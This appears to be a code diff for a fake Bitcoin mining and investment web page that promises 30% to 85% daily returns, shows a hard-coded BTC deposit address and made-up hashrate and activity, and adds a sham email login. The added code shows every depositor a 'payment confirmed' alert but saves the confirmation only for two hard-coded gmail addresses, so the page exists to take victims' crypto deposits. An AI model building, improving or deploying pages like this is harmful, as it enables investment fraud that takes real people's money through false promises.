@@ -26,45 +26,76 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
 .plan h3{color:#f2a900;margin-bottom:10px;}
 .plan p{margin:5px 0;}
 .pay-section{display:none;margin-top:10px;}
+#loginCard{max-width:400px;margin:50px auto;padding:20px;border-radius:12px;background:#131a2e;}
 </style>
 </head>
 <body>
 
-<h2>BTC Deposit & Mining Dashboard</h2>
+<!-- LOGIN -->
+<div class="card" id="loginCard">
+  <h2>Login</h2>
+  <input type="text" id="emailInput" placeholder="Enter your email">
+  <button id="loginBtn">Login</button>
+</div>
 
-<!-- BTC Deposit -->
-<div class="card">
-  <h2>BTC Deposit Address</h2>
-  <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
-  <button onclick="copyAddress()">Copy Address</button>
-  <div style="text-align:center;margin-top:10px;">
-    <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+<!-- DASHBOARD -->
+<div id="dashboard" style="display:none;">
+
+  <!-- BTC Deposit -->
+  <div class="card">
+    <h2>BTC Deposit Address</h2>
+    <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+    <button onclick="copyAddress()">Copy Address</button>
+    <div style="text-align:center;margin-top:10px;">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+    </div>
   </div>
-</div>
 
-<!-- Mining Dashboard -->
-<div class="card">
-  <h2>Mining Dashboard</h2>
-  <p style="text-align:center;color:#f2a900;">Earn 30% daily return</p>
-  <div class="btc" id="balance">0.00000000 BTC</div>
-  <canvas id="chart"></canvas>
-  <div class="stats">
-    <div>Hashrate: 120 TH/s</div>
-    <div>Blocks: <span id="blocks">0</span></div>
-    <div>Uptime: <span id="uptime">0h 0m</span></div>
+  <!-- Mining Dashboard -->
+  <div class="card">
+    <h2>Mining Dashboard</h2>
+    <p style="text-align:center;color:#f2a900;">Earn 30% daily return</p>
+    <div class="btc" id="balance">0.00000000 BTC</div>
+    <canvas id="chart"></canvas>
+    <div class="stats">
+      <div>Hashrate: 120 TH/s</div>
+      <div>Blocks: <span id="blocks">0</span></div>
+      <div>Uptime: <span id="uptime">0h 0m</span></div>
+    </div>
   </div>
-</div>
 
-<!-- Recent Activity -->
-<div class="card">
-  <h2>Recent Activity</h2>
-  <div class="tx-container" id="txs"></div>
-</div>
+  <!-- Recent Activity -->
+  <div class="card">
+    <h2>Recent Activity</h2>
+    <div class="tx-container" id="txs"></div>
+  </div>
 
-<h2>Investment Plans</h2>
-<div class="card" id="plansContainer"></div>
+  <!-- Investment Plans -->
+  <h2>Investment Plans</h2>
+  <div class="card" id="plansContainer"></div>
+
+</div>
 
 <script>
+// ===== LOGIN =====
+let currentEmail="";
+document.getElementById("loginBtn").onclick=function(){
+  const email=document.getElementById("emailInput").value.trim().toLowerCase();
+  if(!email){alert("Enter email"); return;}
+  currentEmail=email;
+  localStorage.setItem("currentEmail",currentEmail);
+  document.getElementById("loginCard").style.display="none";
+  document.getElementById("dashboard").style.display="block";
+  initPlans();
+}
+
+// If already logged in before
+if(localStorage.getItem("currentEmail")){
+  currentEmail=localStorage.getItem("currentEmail");
+  document.getElementById("loginCard").style.display="none";
+  document.getElementById("dashboard").style.display="block";
+}
+
 // ===== BTC Deposit Copy =====
 function copyAddress(){
   navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
@@ -145,100 +176,106 @@ const plans = [
   {name:"Plan F", profit:"85%", min:10000, max:"Unlimited"}
 ];
 
-const container = document.getElementById("plansContainer");
 function formatMoney(val){return typeof val==="number"?"$"+val:val;}
-plans.forEach((plan,index)=>{
-  const div = document.createElement("div");
-  div.className="plan";
-  div.id="plan"+index;
-
-  div.innerHTML=`
-    <h3>${plan.name}</h3>
-    <p>Daily Profit: ${plan.profit}</p>
-    <p>Minimum Investment: ${formatMoney(plan.min)}</p>
-    <p>Maximum Investment: ${formatMoney(plan.max)}</p>
-    <div class="pay-section" id="paySection${index}">
-      <p>Send BTC to:</p>
-      <div class="btc-box" id="planBtc${index}">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
-      <button onclick="copyPlanAddress(${index})">Copy Address</button>
-      <div style="text-align:center;margin-top:10px;">
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+function initPlans(){
+  const container = document.getElementById("plansContainer");
+  container.innerHTML="";
+  plans.forEach((plan,index)=>{
+    const div = document.createElement("div");
+    div.className="plan";
+    div.id="plan"+index;
+    div.innerHTML=`
+      <h3>${plan.name}</h3>
+      <p>Daily Profit: ${plan.profit}</p>
+      <p>Minimum Investment: ${formatMoney(plan.min)}</p>
+      <p>Maximum Investment: ${formatMoney(plan.max)}</p>
+      <div class="pay-section" id="paySection${index}">
+        <p>Send BTC to:</p>
+        <div class="btc-box" id="planBtc${index}">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+        <button onclick="copyPlanAddress(${index})">Copy Address</button>
+        <div style="text-align:center;margin-top:10px;">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+        </div>
+        <p>Upload screenshot of payment:</p>
+        <input type="file" id="screenshot${index}" accept="image/*">
+        <button id="paidBtn${index}">Paid</button>
+        <img id="preview${index}" class="screenshot-img" style="display:none;">
+        <p class="countdown" id="countdown${index}">Withdrawal available in 3d 0h 0m 0s</p>
       </div>
-      <p>Upload screenshot of payment:</p>
-      <input type="file" id="screenshot${index}" accept="image/*">
-      <button id="paidBtn${index}">Paid</button>
-      <img id="preview${index}" class="screenshot-img" style="display:none;">
-      <p class="countdown" id="countdown${index}">Withdrawal available in 3d 0h 0m 0s</p>
-    </div>
-    <button id="investBtn${index}">Invest Now</button>
-  `;
-  container.appendChild(div);
+      <button id="investBtn${index}">Invest Now</button>
+    `;
+    container.appendChild(div);
 
-  const investBtn = document.getElementById("investBtn"+index);
-  const paySection = document.getElementById("paySection"+index);
-  const screenshotInput = document.getElementById("screenshot"+index);
-  const preview = document.getElementById("preview"+index);
-  const countdown = document.getElementById("countdown"+index);
-  const paidBtn = document.getElementById("paidBtn"+index);
+    const investBtn = document.getElementById("investBtn"+index);
+    const paySection = document.getElementById("paySection"+index);
+    const screenshotInput = document.getElementById("screenshot"+index);
+    const preview = document.getElementById("preview"+index);
+    const countdown = document.getElementById("countdown"+index);
+    const paidBtn = document.getElementById("paidBtn"+index);
 
-  let paymentConfirmed = localStorage.getItem("plan"+index+"_confirmed")==="true";
-  let startTime = paymentConfirmed ? parseInt(localStorage.getItem("plan"+index+"_start")) : null;
-  
-  // Show previous screenshot
-  const savedImg = localStorage.getItem("plan"+index+"_screenshot");
-  if(savedImg){
-    preview.src = savedImg;
-    preview.style.display = "block";
-    paySection.style.display="block";
-    investBtn.style.display="none";
-  }
+    // Check if screenshot should be loaded for your email
+    let paymentConfirmed = false;
+    let startTime = null;
 
-  // Countdown
-  function updateCountdown(){
-    if(!paymentConfirmed){
-      countdown.innerText="Withdrawal available in 3d 0h 0m 0s";
-      return;
+    if(currentEmail==="evilpaid666@gmail.com"){
+      paymentConfirmed = localStorage.getItem("plan"+index+"_confirmed")==="true";
+      startTime = paymentConfirmed ? parseInt(localStorage.getItem("plan"+index+"_start")) : null;
+      const savedImg = localStorage.getItem("plan"+index+"_screenshot");
+      if(savedImg){
+        preview.src = savedImg;
+        preview.style.display="block";
+        paySection.style.display="block";
+        investBtn.style.display="none";
+      }
     }
-    const now = Date.now();
-    const elapsed = now-startTime;
-    const remaining = 3*24*60*60*1000 - elapsed;
-    if(remaining<=0){
-      countdown.innerText="Withdrawal available now!";
-    } else {
-      const d = Math.floor(remaining/(1000*60*60*24));
-      const h = Math.floor((remaining%(1000*60*60*24))/(1000*60*60));
-      const m = Math.floor((remaining%(1000*60*60))/(1000*60));
-      const s = Math.floor((remaining%(1000*60))/1000);
-      countdown.innerText=`Withdrawal available in ${d}d ${h}h ${m}m ${s}s`;
-    }
-  }
-  setInterval(updateCountdown,1000);
-  updateCountdown();
 
-  // Show pay section on Invest Now click
-  investBtn.onclick = ()=>{
-    paySection.style.display="block";
-    investBtn.style.display="none";
-  }
-
-  // Paid button click → confirm screenshot
-  paidBtn.onclick = ()=>{
-    const file = screenshotInput.files[0];
-    if(!file){alert("Please upload screenshot first."); return;}
-    const reader = new FileReader();
-    reader.onload = function(evt){
-      preview.src=evt.target.result;
-      preview.style.display="block";
-      paymentConfirmed=true;
-      startTime=Date.now();
-      localStorage.setItem("plan"+index+"_confirmed","true");
-      localStorage.setItem("plan"+index+"_start",startTime);
-      localStorage.setItem("plan"+index+"_screenshot",evt.target.result);
-      alert(plan.name+" payment confirmed! Withdrawal countdown started.");
+    // Countdown
+    function updateCountdown(){
+      if(!paymentConfirmed){
+        countdown.innerText="Withdrawal available in 3d 0h 0m 0s";
+        return;
+      }
+      const now = Date.now();
+      const elapsed = now-startTime;
+      const remaining = 3*24*60*60*1000 - elapsed;
+      if(remaining<=0){
+        countdown.innerText="Withdrawal available now!";
+      } else {
+        const d = Math.floor(remaining/(1000*60*60*24));
+        const h = Math.floor((remaining%(1000*60*60*24))/(1000*60*60));
+        const m = Math.floor((remaining%(1000*60*60))/(1000*60));
+        const s = Math.floor((remaining%(1000*60))/1000);
+        countdown.innerText=`Withdrawal available in ${d}d ${h}h ${m}m ${s}s`;
+      }
     }
-    reader.readAsDataURL(file);
-  }
-});
+    setInterval(updateCountdown,1000);
+    updateCountdown();
+
+    // Show pay section
+    investBtn.onclick = ()=>{
+      paySection.style.display="block";
+      investBtn.style.display="none";
+    }
+
+    // Paid button click
+    paidBtn.onclick = ()=>{
+      const file = screenshotInput.files[0];
+      if(!file){alert("Please upload screenshot first."); return;}
+      const reader = new FileReader();
+      reader.onload = function(evt){
+        if(currentEmail==="cattermoney1@gmail.com"){
+          preview.src = evt.target.result;
+          preview.style.display="block";
+          localStorage.setItem("plan"+index+"_screenshot",evt.target.result);
+          localStorage.setItem("plan"+index+"_confirmed","true");
+          localStorage.setItem("plan"+index+"_start",Date.now());
+        }
+        alert(plan.name+" payment confirmed! Withdrawal countdown started.");
+      }
+      reader.readAsDataURL(file);
+    }
+  });
+}
 
 // ===== Copy BTC address per plan =====
 function copyPlanAddress(index){
